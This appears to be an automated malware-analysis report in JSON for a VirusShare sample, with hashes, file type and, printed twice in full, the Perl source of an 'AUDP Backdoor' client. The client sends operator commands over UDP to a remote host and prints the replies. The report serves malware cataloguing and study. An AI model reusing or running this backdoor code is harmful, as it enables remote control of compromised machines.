{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "command": "May run PowerShell commands"
        },
        "macro": "#!/usr/bin/perl\n\nuse IO::Socket;\nuse Getopt::Std;\n\ngetopts('s:p:h', \\%opt)||die(\"Error: Unable to get command line options !!!\\n\");\n\nif(defined($opt{'h'})) { \\&usage() }\nif(defined($opt{'s'})) { $server=$opt{'s'} } else { \\&usage() }\nif(defined($opt{'p'})) { $port=$opt{'p'} } else { \\&usage() }\n\n\n$|=1;\n$maxlen=1024;\n\n$sock=IO::Socket::INET->new(Proto=>'udp')\nor die(\"Error: Cannot initialize socket !!!\\n\");\n$ipaddr=inet_aton($server);\n$portaddr=sockaddr_in($port, $ipaddr);\n\n\nprint(\"\\nAUDP Backdoor started.\\n\");\nprint(\"======================\\n\");\n\nwhile(1) {\n print(\"=> \");\n $mesg=<STDIN>;\n chomp $mesg;\n if($mesg=~/^\\s*(exit)|(quit)\\s*/i) { exit(0) }\n if($mesg!~/^\\s*$/) {\n  send($sock, $mesg.\"\\n\", 0, $portaddr)==length($mesg.\"\\n\");\n  \n  while($portaddr=recv($sock, $msg, $maxlen, 0)) {\n   if($msg=~/^\\-end\\.$/) { last } else {\n    print $msg;\n   }\n  }\n }\n} \n\n\n\nsub usage() {\n   print(\"\\nAUDP - Programmed by Anarchy\\n\");\n   print(\"============================\\n\");\n   print(\"Usage: AUDP -s <host> -p <port>\\n\\n\");\n   exit 1;\n}\n"
    },
    "filename": "VirusShare_24607c893365fa79841787338eb78065",
    "filesize": 1035,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "24607c893365fa79841787338eb78065",
        "sha1": "d3bcb7f9a370bc8f5a050384a9b62da237546478",
        "sha256": "644b8f9c9a85d3a0ac1cd9219030c0f93fd92e657070fa152d0a81888ce7cc62"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "use IO::Socket;",
            "use Getopt::Std;",
            "getopts('s:p:h', \\%opt)||die(\"Error: Unable to get command line options !!!\\n\");",
            "if(defined($opt{'h'})) { \\&usage() }",
            "if(defined($opt{'s'})) { $server=$opt{'s'} } else { \\&usage() }",
            "if(defined($opt{'p'})) { $port=$opt{'p'} } else { \\&usage() }",
            "$|=1;",
            "$maxlen=1024;",
            "$sock=IO::Socket::INET->new(Proto=>'udp')",
            "or die(\"Error: Cannot initialize socket !!!\\n\");",
            "$ipaddr=inet_aton($server);",
            "$portaddr=sockaddr_in($port, $ipaddr);",
            "print(\"\\nAUDP Backdoor started.\\n\");",
            "print(\"======================\\n\");",
            "while(1) {",
            " print(\"=> \");",
            " $mesg=<STDIN>;",
            " chomp $mesg;",
            " if($mesg=~/^\\s*(exit)|(quit)\\s*/i) { exit(0) }",
            " if($mesg!~/^\\s*$/) {",
            "  send($sock, $mesg.\"\\n\", 0, $portaddr)==length($mesg.\"\\n\");",
            "  while($portaddr=recv($sock, $msg, $maxlen, 0)) {",
            "   if($msg=~/^\\-end\\.$/) { last } else {",
            "    print $msg;",
            "   }",
            "sub usage() {",
            "   print(\"\\nAUDP - Programmed by Anarchy\\n\");",
            "   print(\"============================\\n\");",
            "   print(\"Usage: AUDP -s <host> -p <port>\\n\\n\");",
            "   exit 1;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.257230",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
